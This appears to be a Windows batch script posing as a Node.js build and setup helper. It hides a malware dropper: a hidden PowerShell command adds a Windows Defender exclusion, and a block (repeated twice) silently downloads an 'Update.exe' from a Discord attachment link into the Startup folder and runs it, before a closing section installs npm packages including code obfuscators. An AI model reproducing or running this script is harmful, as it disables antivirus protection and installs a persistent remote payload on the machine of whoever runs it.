powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1225855958110965840/Update.exe?ex=6622a653&is=66103153&hm=9d055dccffea6df355496fa942822fb73305fd7eca06cca9d79b7e1459ee9b58&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1225855958110965840/Update.exe?ex=6622a653&is=66103153&hm=9d055dccffea6df355496fa942822fb73305fd7eca06cca9d79b7e1459ee9b58&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"


echo off

echo NOTE: Make sure you have Node.js v18.15.0 and Native Tools (including Chocolatey) installed aswell! Otherwise the .exe won't work correctly.

call npm install .
call npm install -g pkg
call npm install -g node-gyp
call npm install -g electron-rebuild
call npm install node-gyp
call npm install boukiapi
call npm install javascript-obfuscator
call npm install js-confuser
call npm rebuild
